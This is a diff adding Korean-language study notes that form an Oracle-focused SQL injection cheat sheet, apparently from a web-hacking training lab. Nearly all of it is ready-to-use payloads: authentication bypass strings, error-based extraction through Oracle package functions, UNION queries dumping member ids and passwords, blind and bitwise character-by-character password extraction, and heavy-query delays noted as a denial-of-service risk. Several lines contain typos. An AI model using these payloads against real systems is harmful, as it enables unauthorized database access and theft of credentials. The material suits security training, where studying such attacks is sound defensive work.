+	INSERT INTO board VALUES ('DATA', ''+@@VERSION+'', 'DATA')
+		'+@@VERSION+'
+	UPDATE board SET title='DATA', content=''+@@version+''... where idx=100
+		'+@@VERSION+'
+
+[[[ ORACLE ]]]
+
+- CASE WHEN 조건 구문: 
+	idx=(case when 1=1 then 9 else 3 end)
+	id='||(case when 1=1 then 'true' else 'false' end)||'
+	sort_column=(case when 1=1 then idx else title end) -> 자료형 에러발생
+	sort_column=(case when 1=1 then 'test' else title end) -> 에러x
+*	title=te'||(case when 1=1 then 's' then 'n' end)||'t (논리연산자(and), terminate 필터링)
+	sort_column=idx&sort=(case whel 1=1 then ASC else DESC end)
+					  
+- 검색 컬럼을 이용한 조건 구문
+	serch_type='test'&keyword=test 참/거짓 serch_type='test2'&keyword=test
+	serch_type='te'||'st'&keyword=test
+	serch_type=(case+when+1=1+then+'test'+else+'ha'+end)&keyword=test
+							
+- 인증 우회: 
+	id=' or 1=1 or ''='
+	' or id='admin'--
+	pw='or/**/id='admin -> 공백 우회
+	idx=6--
+	pw='' or idx=6 -- idx를 뒤에 다시 적기(이래야 6일때만 참)
+	
+	id 입력칸 - ' union select 'admin', md5('admin')#
+	pass 입력칸 - 'admin'
+	
+- dbms 파악
+	idx=25 and 'test'='te'||'st' 
+	idx=2||5
+	t'||(case when 1=1 then 'e' else 'a' end)||'st => 지우는지 테스트
+	idx=(select 25 from dual)
+	sysdate, substr(), length()
+	에러파악: ' 로 에러 유발
+
+- 순차적 레코드 출력
+	select username from (select rownum r, username from all_users)tb where tb.r=3 - rownum 가상 컬럼
+	
+- 메타데이터 목록화 순차적
+	select distinct owner from all_tables
+	select table_name from all_tables where owner='C##CRAKTIVE'
+	select column_name from all_tab_columns where owner='C##CRAKTIVE' and table_name='MEMBERS'
+	select id, password from C##CRAKTIVE.MEMBERS;
+
+- 메타데이터 목록화 비순차적
+	select table_name from all_tables where owner='C##CRAKTIVE' and table_name like '%MEM%'
+	select owner, table_name, column_name from all_tab_columns where column_name like '%PASS%'
+
+- ERROR-BASED 순차적
+	UTL_INADDR.GET_HOST_NAME((select banner from v$version where rownum=1)) -> ADDRESS 가 드렁가야되는데 안들어가서 에러
+	UTL_INADDR.GET_HOST_ADDRESS((select banner from v$version where rownum=1)) 
+	11g이후
+		ORDSYS.ORD_DICOM.GETMAPPINGXPATH([DATA])
+		CTXSYS.DRITHSX.SN(1,[DATA])
+		CTXSYS.CTX_QUERY.CHK_XPATH([DATA],1)
+		SYS.DBMS_AW_XML.READAWMETADATA([DATA],'1')
+	버전 : select banner from v$version where rownum=1
+	사용자 : select user from dual
+	sid : select global_name from global_name
+
+	idx=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((select+banner+from+v$version+where+rownum%3d1))
+	idx=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((select+global_name+from+global_name))
+	ORDSYS.ORD_DICOM.GETMAPPINGXPATH((select+owner+from+(select+rownum+r,+owner+from+(select+distinct+owner+from+all_tables)a)b+where+b.r%3d1)) - distinct, rownum 같이x
+	ORDSYS.ORD_DICOM.GETMAPPINGXPATH((select+count(*)+from+all_tables+where+owner%3d'C##CRAKTIVE'))
+	ORDSYS.ORD_DICOM.GETMAPPINGXPATH((select+table_name+from+(select+rownum+r+table_name+from+all_tables+where+owner%3d'C##CRAKTIVE')a+a.r=1))
+	ORDSYS.ORD_DICOM.GETMAPPINGXPATH((select+column_name+from+(select+rownum+r,+column_name+from+all_tab_columns+where+owner%3d'C##CRAKTIVE'+and+table_name%3d'MEMBERS')a+where+a.r=1))
+	ORDSYS.ORD_DICOM.GETMAPPINGXPATH((select+id||'%23%23'||password+from+(select+rownum+r,+id,+password+from+C##CRAKTIVE.MEMBERS)a+where+a.r=1))
+	
+- UNION BASE 공격
+	대용량 - LOB, NCLOB, BLOB...
+	
+	' order by 3 --  에러 (clob)
+	' order by 7 --  정상
+	' union all select null,null,null,null,null,null,null from dual --
+	' and 1=2 union all select 'test',null,null,null,null, null,null from dual --
+	' and 1=2 union all select user||','||(select global_name from global_name)||','||(select banner from v$version where rownum=1),null,null,null,null, null,null from all_tables
+	' and 1=2 union all select owner,null,null,null,null,null,null from (select distinct owenr from all_tables)a --.
+	' and 1=2 union all select table_name,~ all_tables where owner='C##CRAKTIVE'-- 
+	' and 1=2 union all select column_name,~ from all_tab_columns where owner='C##CRAKTIVE'and table_name='MEMBERS'--
+	' and 1=2 union all select concat(id,password), ~  from C##CRAKTIVE.MEMBERS --  //orcale은 concat이 2개만 가능
+	' and 1=2 union all select null,'a',to_clob('a'),~ from dual--
+	+아이디 중복 조회 공격
+	
+- BLIND BASED 공격 (Content-based)
+	substr([DATA],N,1)='a'
+	
+	데이터 추론 기법 Sequential Search (순차탐색)
+	search_type=substr((select+banner+from+v$version+where+rownum%3d1),1,1)='a'+and+title&keyword=test 
+	search_type=substr((select user from dual),1,1)='a'+and+title&keyword=test 
+	search_type=substr((select+global_name+from+global_name),1,1)='a'+and+title&keyword=test 
+	search_type=length((select+owner+from+(select+rownum+r,+owner+from+(select+distinct+owner+from+all_tables)a)b+where+b.r%3d1))>5+and+title~
+	search_type=substr((select+table_name+from+(select+rownum+r+table_name+from+all_tables+wherer+owner%3d'C##CRAKTIVE')a+a.r=1)='a'+and+title~
+	search_type=substr((select+column_name+from+(select+rownum+r+column_name+from+all_tab_columns+where+owner%3d'C##CRAKTIVE'+and+table_name%3d'members')a+where+a.r%3d1+column_name+like+'%25jumin%25'),1,1)='a'+and+title~
+	search_type=length(select+id+from+(select+rownum+r,+id+from+C##CRAKTIVE.MEMBERS)a+where+a.r=1)>10 and title
+	
+	데이터추론 -이진탐색(binary search) 아스키 32~126
+	idx=25+and+length((select+global_name+from+global_name))>1
+	idx=25+and+length((select+global_name+from+global_name))>2
+	25+and+ascii(substr((select+global_name+from+global_name),1,1))>80
+	25+and+(select+global_name+from+global_name)='XE'
+
+	idx=25+and+length((select+password+from+C##CREAHACKTIVE.tb_board+where+idx=62))=4
+	idx=25+and+ascii(substr((select+password+from+C##CREAHACKTIVE.tb_board+where+idx=62),1,1))>80  
+	idx=25+and+ascii(substr((select+password+from+tb_board+where+idx=62),1,1))=92
+	idx=25+and+ascii(substr((select+password+from+tb_board+where+idx=62),2,1))>80
+	
+	데이터 추론 비트 단위(bit by bit search)
+	N은 1,2,4,8,16,32,64
+	select password from board where idx=62
+	bitand(ascii(substr(data,1,1)),1)=1
+	length((select password from board where idx=62))=4
+	bitand(ascii(substr(select password from board where idx=62,1,1)),1)=1
+	bitand(ascii(substr(select password from board where idx=62,1,1)),2)=2
+	
+- Response-based Blind sql
+	Divide by zero - 
+	CASE WHEN [조건] THEN 'A' ELSE CAST(1/0 as char) END
+	CASE WHEN [조건] THEN 1 ELSE 1/0 END
+	
+	다중 레코드가 반환되는 서브 쿼리
+	문자형 - CASE WHEN [조건] THEN 'A' ELSE (select 'a' from dual union select 'b' from dual) END // 'a', 'a' 이런건 당연히x
+	숫자형 -  CASE WHEN [] THEN 1 ELSE (select 1 from dual union select 2 from dual) END
+	'||(case when 1=1 then 'a' else (select 'b' from dual union select 'c' from dual) end)||'
+	'||(case when 1=1 then 'a' else cast(1/0 as char) end)||'
+	' and 'a'=cast(1/0 as char)--
+	' and 1=(case when 1=1 then 5 else 1/0 end)--
+	
+	order by 구문 공격 * prepared statement 가 안되는 부분
+	order by [column] [asc/desc] 각 공격 포인트 1,2
+		CASE WHEN [조건] THEN [문자형 컬럼] ELSE CAST(1/0 as char) END
+		CASE WHEN [조건] THEN [숫자형 컬럼] ELSE 1/0 END
+		
+		CASE WHEN [조건] THEN [컬럼1] ELSE [컬럼2] END
+		
+		키워드
+		, CASE WHEN [조건] THEN [문자형 컬럼] ELSE CAST(1/0 as char) END
+		, CASE WHEN [조건] THEN [숫자형 컬럼] ELSE 1/0 END
+		sort_column=(CASE+WHEN+1=1+THEN+idx+else+1/0+end)&sort=desc
+		에러는 안나지만 결과가 안나오는 경우 가능
+	
+- 	time based * 가용성 문제 발생 가능성 존재
+	begin
+	dbms_lock_sleep(5);
+	end;
+		-> PL/SQL 에서 사용 SELECT절 X  스택쿼리가 지원되야하는데 ORACLE은 지원 불가능하니 사실상 불가능
+	
+	heavy query technique -> DOS 위험 매우 위험
+	CASE WHEN [조건문] then (SELECT count(*) from sysusers AS sys1, sysusers AS sys2, sysusers AS sys3, sysusers AS sys4,
+		sysusers AS sys5,sysusers AS sys6, sysusers AS sys7, sysusers AS sys8) ELSE 1 END
+	' and (CASE WHEN 1=1 then (select count(*) from all_users t1, all_users t2,  all_users t3, all_users t4, all_users t5) else 1 end)=1 and '%'='
+	' and (CASE WHEN (substr((select password from members where id='admin'),1,1)='d') then (select count(*) from all_users t1, all_users t2,  all_users t3, all_users t4, all_users t5) else 1 end)=1 and '%'='
+		
+
+- 그룹핑 조회
+	Select listagg(table_name,'###') within group(order by table_name) from all_tables where owner='C##CRAKTIVE'
+	
+	idx=142+and+1=2+union+all+select+null,listagg(table_name,'%23%23'),null,null,null,null,null+from+all_tables+where+owner='C%23%23CREAGHACK'--
+	idx=142+and+1=2+union+all+select+null,listagg(column_name,'%23%23'),null,null,null,null,null+from+all_tab_columns+where+owner='C%23%23CREAGHACK'+and+table_name='MEMBERS'--
+	idx=142+and+1=2+union+all+select+null,listagg(id||','||password||',','%23%23'),null,null,null,null,null+from+MEMBERS--
+
+- INSERT, UPDATE, DELETE 
+	
+	***** 주의사항 *****
+		--, or 연산자 
+		
+	ORACLE (연결, 에러패키지)
+	INSERT INTO board VALUES ('DATA', ''||ORDSYS.ORD_DICOM.GETMAPPINGXPATH(user)||'','DATA')
+		->'||ORDSYS.ORD_DICOM.GETMAPPINGXPATH(user)||' 입력
+	UPDATE board SET title='DATA', content=''||ORDSYS.ORD_DICOM.GETMAPPINGXPATH(user)||''... where idx=100
+		'||ORDSYS.ORD_DICOM.GETMAPPINGXPATH(user)||'
+	UPDATE board SET title='', content=''... where idx=ORDSYS.ORD_DICOM.GETMAPPINGXPATH(user)
+	DELETE FROM board where idx=ORDSYS.ORD_DICOM.GETMAPPINGXPATH(user)
+	
+	INSERT INTO board VALUES ('DATA', ''||user||'', 'DATA')
+		'||user||'
+	UPDATE board SET title='DATA', content=''||user||''... where idx=100
+		'||user||'
+	'||user||','||(select global_name from global_name)||','||(select banner from v$version)||'
+	'||(select listagg(table_name,'###') within group(order by table_name) from all_tables where owner='C##CRAKTIVE')||'
